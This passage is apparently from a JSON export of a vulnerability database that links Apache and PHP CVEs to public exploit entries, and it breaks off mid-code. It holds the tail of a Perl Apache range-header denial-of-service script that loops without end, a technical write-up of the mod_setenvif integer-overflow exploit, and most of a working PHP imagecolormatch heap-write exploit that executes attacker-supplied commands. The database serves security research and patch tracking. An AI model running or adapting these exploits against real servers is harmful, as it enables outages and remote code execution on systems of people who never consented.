gzip\\r\\nConnection: close\\r\\n\\r\\n\";\r\nprint $sock $p;\r\n\r\nwhile(<$sock>) {\r\n}\r\n $pm->finish;\r\n}\r\n$pm->wait_all_children;\r\nprint \":pPpPpppPpPPppPpppPp\\n\";\r\n}\r\n\r\nsub testapache {\r\nmy $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],\r\n                                 PeerPort => \"80\",\r\n                     \t\t\t Proto    => 'tcp');\r\n\r\n$p = \"HEAD / HTTP/1.1\\r\\nHost: $ARGV[0]\\r\\nRange:bytes=0-$p\\r\\nAccept-Encoding: gzip\\r\\nConnection: close\\r\\n\\r\\n\";\r\nprint $sock $p;\r\n\r\n$x = <$sock>;\r\nif ($x =~ /Partial/) {\r\n\tprint \"host seems vuln\\n\";\r\n\treturn 1;\t\r\n} else {\r\n\treturn 0;\t\r\n}\r\n}\r\n\r\nif ($#ARGV < 0) {\r\n\tusage;\r\n\texit;\t\r\n}\r\n\r\nif ($#ARGV > 1) {\r\n\t$numforks = $ARGV[1];\r\n} else {$numforks = 50;}\r\n\r\n$v = testapache();\r\nif ($v == 0) {\r\n\tprint \"Host does not seem vulnerable\\n\";\r\n\texit;\t\r\n}\r\nwhile(1) {\r\nkillapache();\r\n}",
            "cvss": {
                "score": 7.8,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17696"
        }
    ],
    "CVE-2011-3607": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for linux platform in category dos / poc",
            "modified": "2017-03-29T00:00:00",
            "published": "2017-03-29T00:00:00",
            "href": "https://0day.today/exploit/description/27473",
            "id": "1337DAY-ID-27473",
            "title": "Apache < 2.0.64 / < 2.2.21 mod_setenvif - Integer Overflow Vulnerability",
            "type": "zdt",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/\r\n \r\n## Background\r\n \r\nThe Apache HTTP Server is an open-source HTTP server for modern operating systems including UNIX, Microsoft Windows, Mac OS/X and Netware. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n \r\n## Problem Description\r\n \r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\r\n \r\n        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\r\n            len += pmatch[no].rm_eo - pmatch[no].rm_so;\r\n        }\r\n \r\nthe length value overflows and is used in a subsequent allocation call of buffer too small:\r\n \r\n \r\n    dest = dst = apr_pcalloc(p, len + 1);\r\n \r\nThe subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\r\n \r\n## Impact\r\n \r\nDepending on the input data, exploitation of this issue leads to:\r\n \r\n- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\r\n- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\r\n- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\r\n \r\nTo trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\r\n \r\n \r\n \r\n \r\n \r\n \r\nSource: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\r\n \r\n## Starting Point\r\n \r\nDuring routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n \r\n## Outline of Exploit\r\n \r\nThe main goals creating the exploit were:\r\n \r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n \r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n \r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.\n\n#  0day.today [2018-03-02]  #",
            "cvss": {
                "score": 4.4,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-27473"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 50494\r\nCVE ID: CVE-2011-3607\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u8de8\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u5728&quot;ap_pregsub()&quot;\u51fd\u6570\u7684\u5b9e\u73b0\u4e0a\u5b58\u5728\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u672c\u5730\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u4ee5\u63d0\u5347\u7684\u6743\u9650\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\r\n\r\n\u8981\u89e6\u53d1\u6b64\u6f0f\u6d1e\uff0c\u9700\u8981\u542f\u7528mod_setenvif\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53d7\u5f71\u54cd\u670d\u52a1\u5668\u4e2d\u653e\u7f6e\u6076\u610f\u7684.htaccess\u6587\u4ef6\u3002\u6b64\u6f0f\u6d1e\u6e90\u4e8e &quot;ap_pregsub()&quot; \u51fd\u6570 (server/utils.c) \u4e2d\u7684\u6574\u6570\u6ea2\u51fa\u9519\u8bef\uff0c\u901a\u8fc7\u7279\u5236\u7684.htaccess\u6587\u4ef6\u53ef\u9020\u6210\u5806\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\r\n\n\nApache HTTP Server 2.2.x\r\nApache HTTP Server 2.0.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/",
            "modified": "2011-11-04T00:00:00",
            "published": "2011-11-04T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-23169",
            "id": "SSV:23169",
            "title": "Apache HTTP Server &quot;ap_pregsub()&quot;\u51fd\u6570\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.4,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:23169"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache < 2.0.64  / < 2.2.21 mod_setenvif - Integer Overflow. CVE-2011-3607,CVE-2011-4415. Dos exploit for Linux platform",
            "modified": "2011-11-02T00:00:00",
            "published": "2011-11-02T00:00:00",
            "id": "EDB-ID:41769",
            "href": "https://www.exploit-db.com/exploits/41769/",
            "type": "exploitdb",
            "title": "Apache < 2.0.64  / < 2.2.21 mod_setenvif - Integer Overflow",
            "sourceData": "Source: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/\r\n\r\n## Background\r\n\r\nThe Apache HTTP Server is an open-source HTTP server for modern operating systems including UNIX, Microsoft Windows, Mac OS/X and Netware. The goal of this project is to provide a secure, efficient and extensible server that provides HTTP services observing the current HTTP standards. Apache has been the most popular web server on the Internet since April of 1996.\r\n\r\n## Problem Description\r\n\r\nDuring routine testing, an integer overflow was found in apache2-mpm-worker 2.2.19 in the function ap_pregsub called from mod-setenvif. The issue affects all versions from 2.0.x to 2.0.64 and 2.2.x to 2.2.21, not depending on the mode of operation (worker, prefork, ..). When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field. When ap_pregsub from server/util.c calculates the buffer size using\r\n\r\n        else if (no < nmatch && pmatch[no].rm_so < pmatch[no].rm_eo) {\r\n            len += pmatch[no].rm_eo - pmatch[no].rm_so;\r\n        }\r\n\r\nthe length value overflows and is used in a subsequent allocation call of buffer too small:\r\n\r\n\r\n    dest = dst = apr_pcalloc(p, len + 1);\r\n\r\nThe subsequent filling of the buffer with user-supplied data leads to buffer overflow. Even without overflowing, the allocation of significant amounts of server memory for excessivly large environment variables should be considered a problem also.\r\n\r\n## Impact\r\n\r\nDepending on the input data, exploitation of this issue leads to:\r\n\r\n- allocation of large quantities of server memory, killing processes due to out-of-memory conditions or reducing system performance to crawl due to massive swapping.\r\n- invalid memory access when copying more than 4GB of data into the much smaller buffer. Since the loop copying the data uses only stack and libc-heap, not the apr pool, for source and destination addresses, copy process is linear, starting at low address and pool is separated by unaccessible memory pages for protection on linux. Usually this will only cause termination of the apache process, which is restarted automatically. The impact is increased system load and DOS-condition while under attack.\r\n- At least with multi-threaded server (worker), arbitrary code execution is proven, on single-threaded varians, the use of crafted stop-sequences might allow code execution even on these systems. On many systems ASLR will reduce the efficiency of the attack, but even with ASLR enabled, the automatic restart of processes allows to probe for all possible mappings of libc. An attacker, that has already access to another account on the machen, might be able to use ApacheNoFollowSymlinkTimerace to learn the memory map of the process, thus having the posibility to reach nearly 100% efficiency.\r\n\r\nTo trigger this issue, mod_setenvif must be enabled and the attacker has to be able to place a crafted .htaccess file on the server. Since the triggering of the exploit might depend on a magic header field, the malicious .htaccess might be placed as backdoor in web-content .zip files or could be stored dormant on the server until activation by the corresponding magic request.\r\n\r\n\r\n\r\n\r\n\r\n\r\nSource: http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html\r\n\r\n## Starting Point\r\n\r\nDuring routine testing, an integer overflow in apache2-mpm-worker 2.2.19 mod-setenvif was found. The crash occured when mangling request headers using a crafted .htaccess-file (http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/SingleThread-htaccess). The broken code was ap_pregsub in server/util.c, where the buffer size of a new header field could overflow, the value was then used for memory allocation. When copying data to the buffer an, overwrite of the an apr (apache portable runtime) memory-pool boundaries occured, similar to standard heap buffer overflows.\r\n\r\n## Outline of Exploit\r\n\r\nThe main goals creating the exploit were:\r\n\r\n- Exploit has to be triggerable via HTTP GET requests only\r\n- Exploit data has to be 0-byte free to have valid HTTP-protocol\r\n- No alternative way of heap-spraying is used, e.g. GET + content-length. All variants I knew of had much too low efficiency\r\n- Use libc for ROP, although all libc-addresses start with 0-byte, which cannot be sent via HTTP\r\n- Rely only on libc address guess, but not heap/stack address guess, unless guess could be made nearly 100% reliable\r\n- Use the already open HTTP-connections and turn them into command connections on the fly\r\n- Have exploit in less than 256 bytes\r\n\r\nTwo different exploit layouts were developed. The first one used multiple threads, so that one was overwriting the data of the second thread before hitting the end of the memory area. Precise timing was essential to get shell access.\r\n\r\nThe second one used a more crafted substitution expression, stopping the copy in a single thread by modifying the regular expression currently processed in the thread. Since there is race condition involved, this exploit was far more reliable than the first one.",
            "cvss": {
                "score": 4.4,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:41769"
        }
    ],
    "CVE-2011-3639": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 51869\r\nCVE ID: CVE-2011-3639\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\u3002\r\n\r\nApache HTTP Server 2.0.x\u81f32.0.64\u7248\u672c\u53ca2.2.18\u4e4b\u524d\u76842.2.x\u7248\u672c\u4e2d\u7684mod_proxy\u6a21\u5757\u5728\u5b89\u88c5\u4e86Revision 1179239\u8865\u4e01\u65f6\uff0c\u6ca1\u6709\u6b63\u786e\u4f7f\u7528RewriteRule\u548cProxyPassMatch\u6a21\u5f0f\uff0c\u4ee5\u5339\u914d\u53cd\u5411\u4ee3\u7406\u7684\u914d\u7f6e\uff0c\u8fd9\u4f1a\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7HTTP/0.9\u534f\u8bae\u53d1\u9001\u7578\u5f62\u8bf7\u6c42\u5230\u5185\u90e8\u670d\u52a1\u5668\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u67d0\u4e9b\u5b89\u5168\u9650\u5236\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002\n0\nApache HTTP Server 2.2.x\r\nApache HTTP Server 2.0.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://httpd.apache.org/",
            "modified": "2012-02-08T00:00:00",
            "published": "2012-02-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30094",
            "id": "SSV:30094",
            "type": "seebug",
            "title": "Apache HTTP Server &quot;mod_proxy&quot;\u53cd\u5411\u4ee3\u7406\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "\n                                                RewriteRule ^(.*) http://www.example.com$1\r\nProxyPassMatch ^(.*) http://www.example.com$1\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30094"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache HTTP Server 2.2.15 'mod_proxy' Reverse Proxy Security Bypass Vulnerability. CVE-2011-3639. Remote exploit for linux platform",
            "modified": "2012-02-06T00:00:00",
            "published": "2012-02-06T00:00:00",
            "id": "EDB-ID:36663",
            "href": "https://www.exploit-db.com/exploits/36663/",
            "type": "exploitdb",
            "title": "Apache HTTP Server <= 2.2.15 'mod_proxy' Reverse Proxy Security Bypass Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/51869/info\r\n\r\nApache HTTP Server is prone to a security-bypass vulnerability.\r\n\r\nSuccessful exploits will allow attackers to bypass certain security restrictions and obtain sensitive information about running web applications. \r\n\r\nRewriteRule ^(.*) http://www.example.com$1\r\nProxyPassMatch ^(.*) http://www.example.com$1 ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36663"
        }
    ],
    "CVE-2019-6977": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category remote exploits",
            "modified": "2019-04-09T00:00:00",
            "published": "2019-04-09T00:00:00",
            "id": "1337DAY-ID-32508",
            "href": "https://0day.today/exploit/description/32508",
            "title": "PHP 7.2 - imagecolormatch() Out of Band Heap Write Exploit",
            "type": "zdt",
            "sourceData": "<?php\r\n# imagecolormatch() OOB Heap Write exploit\r\n# https://bugs.php.net/bug.php?id=77270\r\n# CVE-2019-6977\r\n# Charles Fol\r\n# @cfreal_\r\n#\r\n# Usage: GET/POST /exploit.php?f=<system_addr>&c=<command>\r\n# Example: GET/POST /exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi\r\n#\r\n# Target: PHP 7.2.x\r\n# Tested on: PHP 7.2.12\r\n#\r\n\r\n/*\r\n\r\nbuf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);\r\n\r\n\tfor (x=0; x<im1->sx; x++) {\r\n\t\tfor( y=0; y<im1->sy; y++ ) {\r\n\t\t\tcolor = im2->pixels[y][x];\r\n\t\t\trgb = im1->tpixels[y][x];\r\n\t\t\tbp = buf + (color * 5);\r\n\t\t\t(*(bp++))++;\r\n\t\t\t*(bp++) += gdTrueColorGetRed(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetGreen(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetBlue(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetAlpha(rgb);\r\n\t\t}\r\n\r\nThe buffer is written to by means of a color being the index:\r\ncolor = im2->pixels[y][x];\r\n..\r\nbp = buf + (color * 5);\r\n\r\n*/\r\n\r\n#\r\n# The bug allows us to increment 5 longs located after buf in memory.\r\n# The first long is incremented by one, others by an arbitrary value between 0\r\n# and 0xff.\r\n#\r\n\r\nerror_reporting(E_ALL);\r\ndefine('OFFSET_STR_VAL', 0x18);\r\ndefine('BYTES_PER_COLOR', 0x28);\r\n\r\n\r\nclass Nenuphar extends DOMNode\r\n{\r\n\t# Add a property so that std.properties is created\r\n\tfunction __construct()\r\n\t{\r\n\t\t$this->x = '1';\r\n\t}\r\n\r\n\t# Define __get\r\n\t# => ce->ce_flags & ZEND_ACC_USE_GUARDS == ZEND_ACC_USE_GUARDS\r\n\t# => zend_object_properties_size() == 0\r\n\t# => sizeof(intern) == 0x50\r\n\tfunction __get($x)\r\n\t{\r\n\t\treturn $this->$x;\r\n\t}\r\n}\r\n\r\nclass Nenuphar2 extends DOMNode\r\n{\r\n\tfunction __construct()\r\n\t{\r\n\t\t$this->x = '2';\r\n\t}\r\n\r\n\tfunction __get($x)\r\n\t{\r\n\t\treturn $this->$x;\r\n\t}\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$p+$s-1;$j>=$p;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\n# Spray stuff so that we get concurrent memory blocks\r\nfor($i=0;$i<100;$i++)\r\n\t${'spray'.$i} = str_repeat(chr($i), 2 * BYTES_PER_COLOR - OFFSET_STR_VAL);\r\nfor($i=0;$i<100;$i++)\r\n\t${'sprayx'.$i} = str_repeat(chr($i), 12 * BYTES_PER_COLOR - OFFSET_STR_VAL);\r\n\r\n#\r\n# #1: Address leak\r\n# We want to obtain the address of a string so that we can make\r\n# the Nenuphar.std.properties HashTable* point to it and hence control its\r\n# structure.\r\n#\r\n\r\n# We create two images $img1 and $img2, both of 1 pixel.\r\n# The RGB bytes of the pixel of $img1 will be added to OOB memory because we set\r\n# $img2 to have $nb_colors images and we set its only pixel to color number\r\n# $nb_colors.\r\n#\r\n$nb_colors = 12;\r\n$size_buf = $nb_colors * BYTES_PER_COLOR;\r\n\r\n# One pixel image so that the double loop iterates only once\r\n$img1 = imagecreatetruecolor(1, 1);\r\n\r\n# The three RGB values will be added to OOB memory\r\n# First value (Red) is added to the size of the zend_string structure which\r\n# lays under buf in memory.\r\n$color = imagecolorallocate($img1, 0xFF, 0, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n$img2 = imagecreate(1, 1);\r\n\r\n# Allocate $nb_colors colors: |buf| = $nb_colors * BYTES_PER_COLOR = 0x1e0\r\n# which puts buf in 0x200 memory blocks\r\nfor($i=0;$i<$nb_colors;$i++)\r\n\timagecolorallocate($img2, 0, 0, $i);\r\n\r\nimagesetpixel($img2, 0, 0, $nb_colors + 1);\r\n\r\n# Create a memory layout as such:\r\n# [z:   zend_string: 0x200]\r\n# [x:   zend_string: 0x200]\r\n# [y:   zend_string: 0x200]\r\n$z = str_repeat('Z', $size_buf - OFFSET_STR_VAL);\r\n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL);\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL);\r\n\r\n# Then, we unset z and call imagecolormatch(); buf will be at z's memory\r\n# location during the execution\r\n# [buf: long[]     : 0x200]\r\n# [x:   zend_string: 0x200]\r\n# [y:   zend_string: 0x200]\r\n#\r\n# We can write buf + 0x208 + (0x08 or 0x10 or 0x18)\r\n# buf + 0x208 + 0x08 is X's zend_string.len\r\nunset($z);\r\nimagecolormatch($img1, $img2);\r\n\r\n# Now, $x's size has been increased by 0xFF, so we can read further in memory.\r\n#\r\n# Since buf was the last freed block, by unsetting y, we make its first 8 bytes\r\n# point to the old memory location of buf\r\n# [free:             0x200] <-+\r\n# [x:   zend_string: 0x200]   |\r\n# [free:             0x200] --+\r\nunset($y);\r\n# We can read those bytes because x's size has been increased\r\n$z_address = str2ptr($x, 488) + OFFSET_STR_VAL;\r\n\r\n# Reset both these variables so that their slot cannot be \"stolen\" by other\r\n# allocations\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);\r\n\r\n# Now that we have z's address, we can make something point to it.\r\n# We create a fake HashTable structure in Z; when the script exits, each element\r\n# of this HashTable will be destroyed by calling ht->pDestructor(element)\r\n# The only element here is a string: \"id\"\r\n$z = \r\n\t# refcount\r\n\tptr2str(1) .\r\n\t# u-nTableMask meth\r\n\tptr2str(0) .\r\n\t# Bucket arData\r\n\tptr2str($z_address + 0x38) .\r\n\t# uint32_t nNumUsed;\r\n\tptr2str(1, 4) .\r\n    # uint32_t nNumOfElements;\r\n\tptr2str(1, 4) .\r\n\t# uint32_t nTableSize\r\n\tptr2str(0, 4) .\r\n\t# uint32_t nInternalPointer\r\n\tptr2str(0, 4) .\r\n\t# zend_long nNextFreeElement\r\n\tptr2str(0x4242424242424242) .\r\n\t# dtor_func_t pDestructor\r\n\tptr2str(hexdec($_REQUEST['f'])) .\r\n\tstr_pad($_REQUEST['c'], 0x100, \"\\x00\") .\r\n\tptr2str(0, strlen($y) - 0x38 - 0x100);\r\n;\r\n\r\n# At this point we control a string $z and we know its address: we'll make an\r\n# internal PHP HashTable structure point to it.\r\n\r\n\r\n#\r\n# #2: Read Nenuphar.std.properties\r\n#\r\n\r\n# The tricky part here was to find an interesting PHP structure that is\r\n# allocated in the same fastbins as buf, so that we can modify one of its\r\n# internal pointers. Since buf has to be a multiple of 0x28, I used dom_object,\r\n# whose size is 0x50 = 0x28 * 2. Nenuphar is a subclass of dom_object with just\r\n# one extra method, __get().\r\n# php_dom.c:1074: dom_object *intern = ecalloc(1, sizeof(dom_object) + zend_object_properties_size(class_type));\r\n# Since we defined a __get() method, zend_object_properties_size(class_type) = 0\r\n# and not -0x10.\r\n#\r\n# zend_object.properties points to an HashTable. Controlling an HashTable in PHP\r\n# means code execution since at the end of the script, every element of an HT is\r\n# destroyed by calling ht.pDestructor(ht.arData[i]).\r\n# Hence, we want to change the $nenuphar.std.properties pointer.\r\n#\r\n# To proceed, we first read $nenuphar.std.properties, and then increment it\r\n# by triggering the bug several times, until\r\n# $nenuphar.std.properties == $z_address\r\n#\r\n# Sadly, $nenuphar.std.ce will also get incremented by one every time we trigger\r\n# the bug. This is due to (*(bp++))++ (in gdImageColorMatch).\r\n# To circumvent this problem, we create two classes, Nenuphar and Nenuphar2, and\r\n# instanciate them as $nenuphar and $nenuphar2. After we're done changing the\r\n# std.properties pointer, we trigger the bug more times, until\r\n# $nenuphar.std.ce == $nenuphar2.std.ce2\r\n#\r\n# This way, $nenuphar will have an arbitrary std.properties pointer, and its\r\n# std.ce will be valid.\r\n#\r\n# Afterwards, we let the script exit, which will destroy our fake hashtable (Z),\r\n# and therefore call our arbitrary function.\r\n#\r\n\r\n# Here we want fastbins of size 0x50 to match dom_object's size\r\n$nb_colors = 2;\r\n$size_buf = $nb_colors * BYTES_PER_COLOR;\r\n\r\n$img1 = imagecreatetruecolor(1, 1);\r\n# The three RGB values will be added to OOB memory\r\n# Second value (Green) is added to the size of the zend_string structure which\r\n# lays under buf in memory.\r\n$color = imagecolorallocate($img1, 0, 0xFF, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n# Allocate 2 colors so that |buf| = 2 * 0x28 = 0x50\r\n$img2 = imagecreate(1, 1);\r\nfor($i=0;$i<$nb_colors;$i++)\r\n\timagecolorallocate($img2, 0, 0, $i);\r\n\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);\r\n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL - 8);\r\n$nenuphar = new Nenuphar();\r\n$nenuphar2 = new Nenuphar2();\r\n\r\nimagesetpixel($img2, 0, 0, $nb_colors);\r\n\r\n# Unsetting the first string so that buf takes its place\r\nunset($y);\r\n\r\n# Trigger the bug: $x's size is increased by 0xFF\r\nimagecolormatch($img1, $img2);\r\n\r\n$ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);\r\n$ce2_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + $size_buf + 0x28);\r\n$props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);\r\n\r\nprint('Nenuphar.ce: 0x' . dechex($ce1_address) . \"\\n\");\r\nprint('Nenuphar2.ce: 0x' . dechex($ce2_address) . \"\\n\");\r\nprint('Nenuphar.properties: 0x' . dechex($props_address) . \"\\n\");\r\nprint('z.val: 0x' . dechex($z_address) . \"\\n\");\r\nprint('Difference: 0x' . dechex($z_address-$props_address) . \"\\n\");\r\n\r\nif(\r\n\t$ce2_address - $ce1_address < ($z_address-$props_address) / 0xff ||\r\n\t$z_address - $props_address < 0\r\n)\r\n{\r\n\tprint('That won\\'t work');\r\n\texit(0);\r\n}\r\n\r\n\r\n#\r\n# #3: Modifying Nenuphar.std.properties and Nenuphar.std.ce\r\n#\r\n\r\n# Each time we increment Nenuphar.properties by an arbitrary value, ce1_address\r\n# is also incremented by one because of (*(bp++))++;\r\n# Therefore after we're done incrementing props_address to z_address we need\r\n# to increment ce1's address one by one until Nenuphar1.ce == Nenuphar2.ce\r\n\r\n# The memory structure we have ATM is OK. We can just trigger the bug again\r\n# until Nenuphar.properties == z_address\r\n\r\n$color = imagecolorallocate($img1, 0, 0xFF, 0);\r\nimagefill($img1, 0, 0, $color);\r\nimagesetpixel($img2, 0, 0, $nb_colors + 3);\r\n\r\nfor($current=$props_address+0xFF;$current<=$z_address;$current+=0xFF)\r\n{\r\n\timagecolormatch($img1, $img2);\r\n\t$ce1_address++;\r\n}\r\n\r\n$color = imagecolorallocate($img1, 0, $z_address-$current+0xff, 0);\r\nimagefill($img1, 0, 0, $color);\r\n$current = imagecolormatch($img1, $img2);\r\n$ce1_address++;\r\n\r\n# Since we don't want to touch other values, only increase the first one, we set\r\n# the three colors to 0\r\n$color = imagecolorallocate($img1, 0, 0, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n# Trigger the bug once to increment ce1 by one.\r\nwhile($ce1_address++ < $ce2_address)\r\n{\r\n\timagecolormatch($img1, $img2);\r\n}\r\n\r\n# Read the string again to see if we were successful\r\n\r\n$new_ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);\r\n$new_props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);\r\n\r\nif($new_ce1_address == $ce2_address && $new_props_address == 